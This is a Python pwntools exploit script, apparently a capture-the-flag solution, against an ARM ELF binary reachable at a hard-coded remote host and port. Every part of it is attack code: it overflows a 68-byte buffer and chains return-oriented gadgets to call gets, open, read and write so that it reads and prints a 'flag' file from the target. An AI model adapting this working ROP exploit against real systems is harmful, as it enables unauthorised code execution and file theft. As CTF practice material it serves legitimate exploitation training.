from pwn import *
context.log_level = 'debug'
context.arch = 'arm'

TARGET = './0.elf'
HOST = '114.177.250.4'
PORT = 7777

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        return process('sh')
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if not args.R:
    r.sendline('qemu-arm-static 0.elf')
bss = 0x96000
r3 = 0x00010160
r1 = 0x0006d108
r0_r4 = 0x00025e1c
lr_call_r3 = 0x00022e80
r2_p2 = 0x0005be38 # ldr r2, [r0, #0x18] ; str r2, [r3] ; pop {r4, pc}

#set text
payload = 'A' * 68
payload += p32(r0_r4)
payload += p32(bss)
payload += p32(0xdeadbeef) 
payload += p32(r3)
payload += p32(elf.sym['gets']) 
payload += p32(lr_call_r3)
payload += p32(elf.sym['main']) 
r.sendlineafter('World\n', payload)
r.sendlineafter('Bye !\n', "flag\x00\x00\x00\x00"+'A'*8+p32(0x100) * 4)


#open
payload = 'A' * 68
payload += p32(r0_r4)
payload += p32(bss)
payload += p32(0xdeadbeef) 
payload += p32(r3)
payload += p32(elf.sym['open']) 
payload += p32(lr_call_r3)
payload += p32(elf.sym['main']) 
r.sendlineafter('World\n', payload)

#read
payload = 'A' * 68
payload += p32(r0_r4)
payload += p32(bss)
payload += p32(0)
payload += p32(r3)
payload += p32(bss)
payload += p32(r2_p2) # set r3 -> r2
payload += p32(0xdeadbeef)
payload += p32(r0_r4)
payload += p32(3)
payload += p32(0)
payload += p32(r1)
payload += p32(bss+0x20)
payload += p32(r3)
payload += p32(elf.sym['read'])
payload += p32(lr_call_r3)
payload += p32(elf.sym['main'])
r.sendlineafter('World\n', payload)

#write
payload = 'A' * 68
payload += p32(r0_r4)
payload += p32(bss)
payload += p32(0)
payload += p32(r3)
payload += p32(bss)
payload += p32(r2_p2) # set r3 -> r2
payload += p32(0xdeadbeef)
payload += p32(r0_r4)
payload += p32(1)
payload += p32(0)
payload += p32(r1)
payload += p32(bss+0x20)
payload += p32(r3)
payload += p32(elf.sym['write'])
payload += p32(lr_call_r3)
payload += p32(elf.sym['main'])
r.sendlineafter('World\n', payload)

r.interactive()

